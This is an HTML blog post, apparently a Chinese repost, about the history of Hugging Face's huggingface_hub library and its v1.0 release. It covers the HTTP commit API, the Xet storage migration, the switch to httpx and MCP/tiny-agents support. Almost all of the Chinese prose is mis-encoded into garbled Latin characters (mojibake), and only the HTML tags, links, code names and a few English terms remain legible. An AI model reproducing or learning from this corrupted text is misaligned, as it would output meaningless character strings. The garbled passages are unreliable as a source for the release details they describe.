<p>æŸ¥çœ‹å®Œæ•´çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv1.0.0" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v1.0.0" ref="nofollow noopener noreferrer">v1.0 å‘å¸ƒè¯´æ˜</a></p>
<blockquote>
<p>æˆ‘ä»¬å°½å¯èƒ½ç¡®ä¿ v1.0.0 ä¸æ—§ç‰ˆæœ¬å…¼å®¹ã€‚å¤§å¤šæ•°æœºå™¨å­¦ä¹ åº“æ— éœ€ä¿®æ”¹å³å¯å…¼å®¹ v0.x å’Œ v1.xã€‚ä¸»è¦ä¾‹å¤–æ˜¯ <code>transformers</code>ï¼šv4 ç‰ˆæœ¬ä¾èµ– v0.xï¼Œè®¡åˆ’ä¸­çš„ v5 å°†è½¬å‘ v1.xã€‚æŸ¥çœ‹æ­¤ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Fissues%2F3340" target="_blank" title="https://github.com/huggingface/huggingface_hub/issues/3340" ref="nofollow noopener noreferrer">issue</a> è·å–è¯¦ç»†çš„åº“å…¼å®¹æ€§è¡¨ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒåçš„æ•…äº‹</h2>
<p>æ¯ä¸ªä¸»æµåº“èƒŒåéƒ½æœ‰ä¸€æ®µæ•…äº‹ã€‚<code>huggingface_hub</code> çš„æ•…äº‹å§‹äºä¸€ä¸ªç®€å•çš„æƒ³æ³•ï¼š<strong>å¦‚æœå…±äº«æœºå™¨å­¦ä¹ æ¨¡å‹åƒåœ¨ GitHub ä¸Šåˆ†äº«ä»£ç ä¸€æ ·å®¹æ˜“ï¼Œä¼šæ€æ ·ï¼Ÿ</strong></p>
<p>åœ¨ Hugging Face Hub çš„æ—©æœŸé˜¶æ®µï¼Œç ”ç©¶äººå‘˜å’Œå¼€å‘è€…å¸¸å¸¸é¢ä¸´ä¸€ä¸ªå›°æ‰°ï¼š
è®­ç»ƒä¸€ä¸ªå…ˆè¿›çš„æ¨¡å‹ä¸ä»…è€—æ—¶ã€è€—èµ„æºï¼Œè€Œä¸”åœ¨è®­ç»ƒå®Œæˆåï¼Œæ¨¡å‹å¾€å¾€â€œè¢«å›°â€åœ¨ä¸ªäººç”µè„‘é‡Œï¼Œåªèƒ½é€šè¿‡ä¸ç¨³å®šçš„ Google Drive é“¾æ¥è¿›è¡Œåˆ†äº«ã€‚
è¿™å¯¼è‡´ç¤¾åŒºé‡å¤é€ è½®å­ï¼Œèµ„æºæµªè´¹ä¸¥é‡ï¼Œåä½œæ•ˆç‡æä½ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼ŒHugging Face Hub åº”è¿è€Œç”Ÿã€‚æœ€åˆï¼Œå®ƒçš„åŠŸèƒ½å¾ˆç®€å•ï¼Œåªæ˜¯ç”¨äºå…±äº«å’Œæ‰˜ç®¡ä¸ <code>transformers</code> åº“å…¼å®¹çš„æ¨¡å‹æ£€æŸ¥ç‚¹ã€‚è€Œä¸ Hub äº¤äº’çš„å…¨éƒ¨ Python é€»è¾‘ä»£ç ï¼Œä¹Ÿéƒ½å†…ç½®åœ¨ <code>transformers</code> åº“ä¸­ï¼Œå…¶ä»–åº“æ— æ³•å¤ç”¨è¿™äº›åŠŸèƒ½ã€‚</p>
<p>ç›´åˆ° 2020 å¹´åº•ï¼Œæˆ‘ä»¬æ¨å‡ºäº† <code>huggingface_hub</code> çš„é¦–ä¸ªç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.0.1" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.0.1" ref="nofollow noopener noreferrer">v0.0.1</a>ï¼Œå®ƒçš„åˆè¡·æ˜¯ï¼šå°†åŸæœ¬å°è£…åœ¨ <code>transformers</code> åº“ä¸­çš„å†…éƒ¨é€»è¾‘ç‹¬ç«‹å‡ºæ¥ï¼Œæ„å»ºä¸€ä¸ªä¸“ç”¨åº“ï¼Œç”¨äºç»Ÿä¸€è®¿é—®å’Œå…±äº« Hugging Face Hub ä¸Šçš„æœºå™¨å­¦ä¹ æ¨¡å‹ä¸æ•°æ®é›†ã€‚æœ€æ—©çš„ç‰ˆæœ¬éå¸¸ç®€æ´ï¼Œå®ƒåªæ˜¯ä¸€ä¸ª Git æ“ä½œçš„å°è£…å·¥å…·ï¼Œç”¨äºä¸‹è½½æ–‡ä»¶å’Œç®¡ç†ä»“åº“ã€‚ä½†äº”å¹´è¿‡å»ï¼Œå†ç» 35+ ä¸ªç‰ˆæœ¬è¿­ä»£ï¼Œ<code>huggingface_hub</code> å·²è¿œè¿œè¶…è¶Šæœ€åˆçš„è®¾æƒ³ã€‚</p>
<p>è®©æˆ‘ä»¬ä¸€èµ·æ¥å›é¡¾è¿™æ®µå‘å±•å†ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9edc43755ee64e6289f6adcc3bb98468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSHVnZ2luZ0ZhY2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766220038&amp;x-signature=7yR%2BJCcZSTlUDWXEBtVpXILKLi0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">å¥ åŸºé˜¶æ®µï¼ˆ2020â€“2021ï¼‰</h3>
<p>æœ€åˆçš„å‡ ä¸ªç‰ˆæœ¬ä¸ºæ•´ä¸ªåº“æ‰“ä¸‹äº†åŸºç¡€ã€‚
ç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.0.8" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.0.8" ref="nofollow noopener noreferrer">0.0.8</a> å¼•å…¥äº†ç¬¬ä¸€ä¸ª APIï¼Œé€šè¿‡å°è£… Git å‘½ä»¤ï¼Œå®ç°ä¸æ¨¡å‹ä»“åº“çš„äº¤äº’ã€‚
æ¥ç€åœ¨ç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.0.17" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.0.17" ref="nofollow noopener noreferrer">0.0.17</a> ä¸­ï¼ŒåŠ å…¥äº†åŸºäº token çš„è®¤è¯æœºåˆ¶ï¼Œæ”¯æŒè®¿é—®ç§æœ‰ä»“åº“å¹¶å®‰å…¨ä¸Šä¼ å†…å®¹ã€‚
è™½ç„¶è¿™äº›åŠŸèƒ½çœ‹èµ·æ¥å¾ˆåŸºç¡€ï¼Œä½†å®ƒä»¬æ„æˆäº†åæ¥æ‰€æœ‰è¿›æ­¥çš„åŸºçŸ³ã€‚</p>
<h3 data-id="heading-2">é‡è¦è½¬æŠ˜ï¼šä» Git åˆ° HTTPï¼ˆ2022ï¼‰</h3>
<p>2022 å¹´ 6 æœˆï¼Œç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.8.1" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.8.1" ref="nofollow noopener noreferrer">0.8.1</a> å‘å¸ƒï¼Œè¿™æ˜¯ Hugging Face Hub å‘å±•å²ä¸Šçš„ä¸€ä¸ªè½¬æŠ˜ç‚¹â€”â€”æˆ‘ä»¬å¼•å…¥äº† HTTP Commit APIã€‚</p>
<p>ä»æ­¤ï¼Œç”¨æˆ·æ— éœ€å†å®‰è£… Git å’Œ Git LFSï¼Œä¹Ÿèƒ½ç›´æ¥é€šè¿‡ HTTP ä¸Šä¼ æ–‡ä»¶ã€‚æ–°æ¨å‡ºçš„ <code>create_commit()</code> API æå¤§ç®€åŒ–äº†ä¸Šä¼ æµç¨‹ï¼Œå°¤å…¶é€‚åˆå¤„ç†å¤§å‹æ¨¡å‹æ–‡ä»¶â€”â€”è¿™äº›æ–‡ä»¶è¿‡å»é€šè¿‡ Git LFS æ“ä½œèµ·æ¥ååˆ†ç¹çã€‚</p>
<p>æ­¤å¤–ï¼Œè¯¥ç‰ˆæœ¬è¿˜å¼•å…¥äº†æ”¯æŒ Git ç»“æ„æ„ŸçŸ¥çš„ç¼“å­˜æœºåˆ¶ã€‚æ‰€æœ‰ä½¿ç”¨ <code>huggingface_hub</code> çš„åº“ï¼ˆæ— è®ºæ˜¯å®˜æ–¹çš„ transformersï¼Œè¿˜æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼‰ç°åœ¨éƒ½èƒ½å…±äº«åŒä¸€å¥—ç¼“å­˜ç³»ç»Ÿï¼Œå…·å¤‡æ˜¾å¼çš„ç‰ˆæœ¬æ§åˆ¶å’Œæ–‡ä»¶å»é‡åŠŸèƒ½ã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸€æ¬¡æŠ€æœ¯ä¼˜åŒ–ï¼Œæ›´æ˜¯ä¸€æ¬¡ç†å¿µä¸Šçš„é£è·ƒã€‚
æˆ‘ä»¬ä¸å†åªæ˜¯ä¸º transformers æ„å»º Git å·¥å…·ï¼Œè€Œæ˜¯åœ¨æ„å»ºä¸€å¥—ä¸“ä¸ºæœºå™¨å­¦ä¹ æ¨¡å‹å’Œæ•°æ®æ‰“é€ çš„åŸºç¡€è®¾æ–½ï¼Œé¢å‘æ•´ä¸ªæœºå™¨å­¦ä¹ ç”Ÿæ€æœåŠ¡ã€‚</p>
<h3 data-id="heading-3">API èƒ½åŠ›çš„å…¨é¢æ‰©å±•ï¼ˆ2022â€“2024ï¼‰</h3>
<p>éšç€ Hugging Face Hub ä»ä¸€ä¸ªæ¨¡å‹ä»“åº“é€æ­¥å‘å±•ä¸ºä¸€ä¸ªå®Œæ•´çš„å¹³å°ï¼Œ<code>huggingface_hub</code> çš„ API èƒ½åŠ›ä¹Ÿä¸æ–­æ‹“å±•ï¼Œæ»¡è¶³æ›´å¤šåœºæ™¯éœ€æ±‚ã€‚</p>
<p>æ ¸å¿ƒçš„ä»“åº“æ“ä½œåŠŸèƒ½ä¸æ–­æˆç†Ÿï¼Œæ”¯æŒï¼š</p>
<ul>
<li>åˆ—å‡ºæ–‡ä»¶æ ‘ï¼ˆlist treeï¼‰</li>
<li>æµè§ˆå¼•ç”¨ï¼ˆrefsï¼‰ä¸æäº¤è®°å½•ï¼ˆcommitsï¼‰</li>
<li>è¯»å–æ–‡ä»¶æˆ–åŒæ­¥æ•´ä¸ªæ–‡ä»¶å¤¹</li>
<li>ç®¡ç†æ ‡ç­¾ã€åˆ†æ”¯å’Œå‘å¸ƒå‘¨æœŸï¼ˆrelease cycleï¼‰</li>
<li>æŸ¥è¯¢ä»“åº“å…ƒæ•°æ®ä¸è®¾ç½® webhookï¼Œå¸®åŠ©å›¢é˜Ÿå®æ—¶å“åº”å˜æ›´</li>
</ul>
<p>ä¸æ­¤åŒæ—¶ï¼ŒHub ä¸Šçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Fmanage-spaces" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/manage-spaces" ref="nofollow noopener noreferrer">Spaces</a> åŠŸèƒ½å¼€å§‹å´­éœ²å¤´è§’ï¼Œå®ƒæ˜¯ä¸€ä¸ªç®€å•å´å¼ºå¤§çš„æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥åœ¨ Hub ä¸Šæ‰˜ç®¡å’Œåˆ†äº«äº¤äº’å¼çš„æœºå™¨å­¦ä¹ æ¼”ç¤ºé¡¹ç›®ã€‚<code>huggingface_hub</code> ä¹Ÿé€æ­¥å®ç°äº†å¯¹ Spaces çš„å®Œæ•´ç¨‹åºåŒ–ç®¡ç†èƒ½åŠ›ï¼ŒåŒ…æ‹¬ç¡¬ä»¶èµ„æºç”³è¯·ã€ç¯å¢ƒé…ç½®ã€å¯†é’¥ç®¡ç†ã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚</p>
<p>ä¸ºäº†æ”¯æŒæ¨¡å‹åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„éƒ¨ç½²ï¼Œæˆ‘ä»¬è¿˜é›†æˆäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Finference_endpoints" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/inference_endpoints" ref="nofollow noopener noreferrer">Inference Endpoints</a>ã€‚è€Œåœ¨ 2025 å¹´ç¬¬ä¸‰å­£åº¦ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Fjobs" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/jobs" ref="nofollow noopener noreferrer">Jobs API</a> çš„åŠ å…¥ï¼Œè¿›ä¸€æ­¥å®Œå–„äº† Hugging Face çš„è®¡ç®—æœåŠ¡èƒ½åŠ›ã€‚</p>
<p>åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œç¤¾åŒºä¸ç¤¾äº¤å±‚ä¹Ÿè¢«æå‡ä¸ºä¸€ç­‰å…¬æ°‘ã€‚ç°åœ¨æ”¯æŒï¼š</p>
<ul>
<li>åˆ›å»ºå’Œç®¡ç† <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Fcommunity" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/community" ref="nofollow noopener noreferrer">Pull Requests å’Œè¯„è®º</a></li>
<li>æŸ¥è¯¢ç”¨æˆ·ä¸ç»„ç»‡ä¿¡æ¯</li>
<li>ä»“åº“ç‚¹èµã€å…³æ³¨ã€ç²‰ä¸åŠŸèƒ½</li>
<li>ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Fcollections" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/collections" ref="nofollow noopener noreferrer">Collections</a> æ•´ç†å’Œåˆ†äº«èµ„æºåˆé›†</li>
</ul>
<p>åŒæ—¶ï¼Œæ—¥å¸¸ä½¿ç”¨ä½“éªŒä¹Ÿå¾—åˆ°äº†æ˜¾è‘—ä¼˜åŒ–ï¼šColab ä¸­çš„æ— ç¼è®¤è¯ã€å¤§å‹æ–‡ä»¶å¤¹ä¸Šä¼ çš„å¯é æ€§æå‡ã€æ”¯æŒæ–­ç‚¹ç»­ä¼ ç­‰åŠŸèƒ½ï¼Œä½¿å¼€å‘æ›´åŠ é«˜æ•ˆæµç•…ã€‚</p>
<p>éšåï¼Œåœ¨ç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.28.0" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.28.0" ref="nofollow noopener noreferrer">v0.28.0</a> ä¸­ï¼Œæˆ‘ä»¬æ¨å‡ºäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fguides%2Finference" target="_blank" title="https://huggingface.co/docs/huggingface_hub/guides/inference" ref="nofollow noopener noreferrer">æ¨ç†æœåŠ¡æä¾›æ–¹ç”Ÿæ€</a>ã€‚ä¸å†ä¾èµ–å•ä¸€çš„æ¨ç†åç«¯ï¼Œè€Œæ˜¯ä¸å¤šå®¶æ— æœåŠ¡å™¨æ¨ç†å¹³å°åˆä½œï¼ŒåŒ…æ‹¬ Together AIã€SambaNovaã€Replicateã€Cerebrasã€Groq ç­‰ï¼Œç”¨æˆ·é€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„ API å³å¯è°ƒç”¨å¤šä¸ªåç«¯ï¼Œè·¯ç”±é€æ˜ï¼ŒæŒ‰è¯·æ±‚è®¡è´¹ï¼ŒçœŸæ­£å®ç°äº†â€œæŒ‰éœ€è°ƒç”¨ï¼Œè½»æ¾æ¨ç†â€ã€‚</p>
<h3 data-id="heading-4">Ready. Xet. Go!ï¼ˆ2024â€“2025ï¼‰</h3>
<p>åœ¨ç‰ˆæœ¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.30.0" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.30.0" ref="nofollow noopener noreferrer">v0.30.0</a> ä¸­ï¼Œæˆ‘ä»¬å‘å¸ƒäº† Xet â€”â€” ä¸€ç§é¢ è¦†æ€§çš„ Git å¤§æ–‡ä»¶å­˜å‚¨åè®®ã€‚</p>
<p>ä¸ä¼ ç»Ÿçš„ Git LFSï¼ˆåªæ”¯æŒæ–‡ä»¶çº§å»é‡ï¼‰ä¸åŒï¼ŒXet åœ¨æ›´ç²¾ç»†çš„ç²’åº¦ï¼ˆæ¯ 64KB ä¸ºä¸€å—ï¼‰è¿›è¡Œæ•°æ®å»é‡ä¸ä¼ è¾“ä¼˜åŒ–ã€‚å½“ä½ æ›´æ–°ä¸€ä¸ªå¤§å‹æ¨¡å‹æˆ–æ•°æ®æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿåªä¼šä¸Šä¼ æˆ–ä¸‹è½½å‘ç”Ÿå˜æ›´çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶ã€‚</p>
<p>è¿™åœº<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fspaces%2Fjsulz%2Fready-xet-go" target="_blank" title="https://huggingface.co/spaces/jsulz/ready-xet-go" ref="nofollow noopener noreferrer">å¤§è§„æ¨¡è¿ç§»</a> å§‹äº 50 å¤šä¸‡ä¸ªä»“åº“ï¼Œæ¶‰åŠè¶…è¿‡ 20PB çš„æ•°æ®ã€‚ä½†ä»¤äººæƒŠå–œçš„æ˜¯ï¼Œè¿™ä¸€è¿ç§»è¿‡ç¨‹å¯¹ç”¨æˆ·æ˜¯å®Œå…¨é€æ˜çš„ï¼Œ100% å‘åå…¼å®¹ï¼Œæ— éœ€æ‰‹åŠ¨å¹²é¢„ï¼Œä¹Ÿæ²¡æœ‰ä¸­æ–­ç°æœ‰æµç¨‹ã€‚</p>
<p>ä¸€å¹´åï¼Œè¶…è¿‡ <strong>6,000,000 ä¸ªä»“åº“</strong>ã€<strong>77PB+</strong> çš„æ•°æ®å·²æˆåŠŸè¿ç§»è‡³ Xet åç«¯ï¼Œå¸¦æ¥äº†æ›´å¿«ã€æ›´æ™ºèƒ½çš„ä¸Šä¼ ä¸ä¸‹è½½ä½“éªŒ ğŸ”¥</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3765e1c8418484eb425b2e1f9535404~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSHVnZ2luZ0ZhY2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766220038&amp;x-signature=wtT%2Fz%2Ftw%2BvpLT7HwxLmKKoo%2FKxA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">æˆé•¿ä¸å½±å“åŠ›è¡¡é‡</h2>
<p>è¡¡é‡ä¸€ä¸ªå¼€æºåº“çš„æˆé•¿å’Œå½±å“åŠ›å¹¶ä¸å®¹æ˜“ï¼Œä½†æœ‰æ—¶ï¼Œæ•°å­—æœ¬èº«å°±æ˜¯æœ€å¥½çš„è¯æ˜ï¼š</p>
<ul>
<li><strong>æ¯æœˆä¸‹è½½é‡è¾¾ 1.135 äº¿æ¬¡</strong>ï¼Œ<strong>ç´¯è®¡ä¸‹è½½è¶… 16 äº¿æ¬¡</strong>ï¼ˆæˆªè‡³ 2025 å¹´ 10 æœˆï¼‰</li>
<li>æä¾›è®¿é—® <strong>200 ä¸‡+ å…¬å…±æ¨¡å‹</strong>ã€<strong>50 ä¸‡+ å…¬å…±æ•°æ®é›†</strong> å’Œ <strong>100 ä¸‡+ å…¬å…± Spaces</strong> â€”â€” å¦‚æœåŒ…æ‹¬ç§æœ‰ä»“åº“ï¼Œæ€»é‡å¤§çº¦ç¿»å€</li>
<li>æ¯æ—¥æ´»è·ƒç”¨æˆ·è¶…è¿‡ <strong>6 ä¸‡äºº</strong>ï¼Œæ¯æœˆæ´»è·ƒç”¨æˆ·è¶…è¿‡ <strong>55 ä¸‡äºº</strong></li>
<li>è¢«å…¨çƒ <strong>20 ä¸‡+ ä¼ä¸š</strong> ä¿¡èµ–ä½¿ç”¨ï¼Œä»åˆåˆ›å…¬å¸åˆ°ã€Šè´¢å¯Œã€‹500 å¼ºä¼ä¸š</li>
</ul>
<p>ä½†çœŸæ­£ä½“ç°å…¶è§„æ¨¡çš„ï¼Œæ˜¯æ•´ä¸ªç”Ÿæ€çš„å¹¿åº¦å’Œæ·±åº¦ã€‚<code>huggingface_hub</code> å·²æˆä¸º GitHub ä¸Š <strong>è¶…è¿‡ 20 ä¸‡ä¸ªä»“åº“</strong> å’Œ PyPI ä¸Š <strong>3,000 ä¸ªè½¯ä»¶åŒ…</strong> çš„ <strong>ä¾èµ–æ ¸å¿ƒ</strong> ï¼Œæ¶µç›–ä¸»æµæ¡†æ¶å¦‚ Kerasã€LangChainã€PaddleOCRã€ChatTTSã€YOLOã€Google Generative AIã€Moshiã€NVIDIA NeMoã€Open Sora ç­‰ï¼Œè¿˜æœ‰æ— æ•°å°å‹å·¥å…·ä¸é¡¹ç›®ã€‚Hugging Face è‡ªå®¶ç”Ÿæ€ï¼ˆå¦‚ transformersã€diffusersã€datasetsã€sentence-transformersã€gradioã€peftã€trl ç­‰ï¼‰ä¹Ÿéƒ½å»ºç«‹åœ¨å…¶ä¹‹ä¸Šã€‚</p>
<p>æœ€ä»¤äººæ¬£æ…°çš„æ˜¯ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹é›†æˆå¤§å¤šæ•°éƒ½æ˜¯è‡ªç„¶å‘ç”Ÿçš„ï¼Œæˆ‘ä»¬å¹¶æœªä¸»åŠ¨æ¨åŠ¨ã€‚è¿™æ­£æ˜¯ Hugging Face Hub é‡Šæ”¾åŠ›é‡çš„ä½“ç°â€”â€”å®ƒè®©æ•´ä¸ªæœºå™¨å­¦ä¹ ç¤¾åŒºèƒ½å¤Ÿæ›´åŠ å¼€æ”¾ã€é«˜æ•ˆåœ°åä½œä¸åˆ›æ–°ï¼Œè€Œå®ƒå¦‚ä»Šçš„å¹¿æ³›ä½¿ç”¨ç¨‹åº¦ï¼Œä¹Ÿè¿œè¶…æˆ‘ä»¬çš„æœ€åˆé¢„æœŸã€‚</p>
<h2 data-id="heading-6">é¢å‘æœªæ¥åå¹´çš„æ„å»º</h2>
<p>v1.0 ä¸åªæ˜¯ä¸€ä¸ªç‰ˆæœ¬å·çš„è·ƒè¿ï¼Œå®ƒä»£è¡¨çš„æ˜¯ï¼š<strong>ä¸ºæœªæ¥åå¹´å¼€æ”¾å¼æœºå™¨å­¦ä¹ å¥ å®šåšå®åŸºç¡€</strong>ã€‚æˆ‘ä»¬åšå‡ºçš„ç ´åæ€§æ›´æ–°å¹¶ééšæ„ä¸ºä¹‹ï¼Œè€Œæ˜¯å‡ºäºæˆ˜ç•¥è€ƒè™‘ï¼Œä¸ºäº†è®© <code>huggingface_hub</code> èƒ½å¤Ÿåº”å¯¹ AI çš„é«˜é€Ÿå‘å±•ï¼Œå¹¶ä¿æŒå…¨çƒæ•°ç™¾ä¸‡å¼€å‘è€…æ‰€ä¾èµ–çš„ç¨³å®šæ€§ä¸å¯é æ€§ã€‚</p>
<h3 data-id="heading-7">ç°ä»£åŒ– HTTP æ¶æ„ï¼šhttpx ä¸ hf_xet</h3>
<p>v1.0 æœ€é‡è¦çš„æ¶æ„å˜æ›´ï¼Œæ˜¯å°†åº•å±‚ HTTP è¯·æ±‚åº“ä» <code>requests</code> è¿ç§»è‡³ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python-httpx.org%2F" target="_blank" title="https://www.python-httpx.org/" ref="nofollow noopener noreferrer"><code>httpx</code></a>ã€‚è¿™ä¸ä»…æ˜¯ä¾èµ–é¡¹çš„æ›¿æ¢ï¼Œè€Œæ˜¯ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šçš„å‡çº§ï¼Œä½¿æ•´ä¸ªåº“æ­£å¼è¿ˆå…¥ç°ä»£ HTTP æ—¶ä»£ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹© httpxï¼Ÿ</strong>
å®ƒå¸¦æ¥çš„å¥½å¤„éå¸¸æ˜¾è‘—ï¼š</p>
<ul>
<li>åŸç”Ÿæ”¯æŒ HTTP/2ï¼Œè¿æ¥æ•ˆç‡æ›´é«˜</li>
<li>å®Œæ•´çš„çº¿ç¨‹å®‰å…¨ï¼Œå¯åœ¨å¤šçº¿ç¨‹é—´å®‰å…¨å¤ç”¨è¿æ¥</li>
<li>æœ€å…³é”®çš„æ˜¯ï¼šæä¾›ç»Ÿä¸€çš„åŒæ­¥ä¸å¼‚æ­¥æ¥å£ï¼Œå½»åº•æ¶ˆé™¤åŸå…ˆåŒæ­¥ä¸å¼‚æ­¥æ¨ç†å®¢æˆ·ç«¯ä¹‹é—´çš„å¾®å¦™å·®å¼‚</li>
</ul>
<p>æ­¤æ¬¡è¿ç§»çš„è®¾è®¡å°½å¯èƒ½åšåˆ°â€œå¯¹ç”¨æˆ·é€æ˜â€ï¼Œå¤§å¤šæ•°ç”¨æˆ·æ— éœ€åšä»»ä½•ä¿®æ”¹ã€‚å¯¹äºä½¿ç”¨è‡ªå®šä¹‰ HTTP åç«¯çš„å¼€å‘è€…ï¼Œæˆ‘ä»¬æä¾›äº†æ¸…æ™°çš„è¿ç§»è·¯å¾„ï¼Œå°† <code>configure_http_backend()</code> æ›¿æ¢ä¸º <code>set_client_factory()</code> æˆ– <code>set_async_client_factory()</code>ã€‚</p>
<p>åŒæ—¶ï¼Œ<code>hf_xet</code> ç°å·²æˆä¸º Hub ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶çš„é»˜è®¤å·¥å…·åŒ…ï¼Œå®Œå…¨å–ä»£æ­¤å‰çš„å¯é€‰æ–¹æ¡ˆ <code>hf_transfer</code>ï¼Œåè€…å·²è¢«å½»åº•ç§»é™¤ã€‚</p>
<h3 data-id="heading-8">MCP ä¸ Tiny-Agentsï¼šè®©æ™ºèƒ½ä½“å¼€å‘è§¦æ‰‹å¯åŠ</h3>
<p>åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Freleases%2Ftag%2Fv0.32.0" target="_blank" title="https://github.com/huggingface/huggingface_hub/releases/tag/v0.32.0" ref="nofollow noopener noreferrer">v0.32.0</a> ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥äº† <strong>Model Context Protocolï¼ˆæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ŒMCPï¼‰é›†æˆ</strong> å’Œ <strong>tiny-agents å·¥å…·é“¾</strong>ï¼Œè¿™ä»æ ¹æœ¬ä¸Šæ”¹å˜äº†æ„å»º AI Agent çš„æ–¹å¼ã€‚æ›¾ç»éœ€è¦å¤æ‚æ¡†æ¶é›†æˆçš„ä»»åŠ¡ï¼Œå¦‚ä»Šåªéœ€å¤§çº¦ 70 è¡Œ Python ä»£ç å³å¯å®Œæˆã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fpackage_reference%2Fmcp" target="_blank" title="https://huggingface.co/docs/huggingface_hub/package_reference/mcp" ref="nofollow noopener noreferrer"><code>MCPClient</code></a> æä¾›äº†ä¸€ä¸ªæ ‡å‡†åŒ–æ¥å£ï¼Œä½¿ AI Agent èƒ½å¤Ÿè½»æ¾ä¸å„ç§å·¥å…·è¿›è¡Œäº¤äº’ï¼›è€Œ <code>tiny-agents</code> CLI å·¥å…·åˆ™å…è®¸ä½ ç›´æ¥ä» Hub å¯åŠ¨ Agentã€‚ä½ å¯ä»¥è¿æ¥æœ¬åœ°æˆ–è¿œç¨‹ MCP æœåŠ¡å™¨ï¼Œå°†ä»»æ„ Gradio Space ç”¨ä½œå·¥å…·ï¼Œå¹¶æ„å»ºå‡ºè‡ªç„¶ã€æµç•…ã€å“åº”è¿…é€Ÿçš„å¯¹è¯å¼æ™ºèƒ½ä½“ã€‚</p>
<p>æ‰€æœ‰è¿™äº›ï¼Œéƒ½æ˜¯åœ¨æˆ‘ä»¬ç°æœ‰çš„ <code>InferenceClient</code> ä»¥åŠå…¶æ”¯æŒçš„å¤šå®¶æ¨ç†æœåŠ¡å•†çš„åŸºç¡€ä¸Šæ„å»ºçš„ã€‚æˆ‘ä»¬åšä¿¡ Agent æ˜¯æœªæ¥ï¼Œè€Œ <code>huggingface_hub</code> å°†æŒç»­æä¾›è¿™äº›æ„å»º AI å·¥å…·çš„åŸºç¡€æ¨¡å—ï¼ŒåŠ©åŠ›å¼€å‘è€…å¿«é€Ÿè½åœ°åˆ›æ–°æƒ³æ³•ã€‚</p>
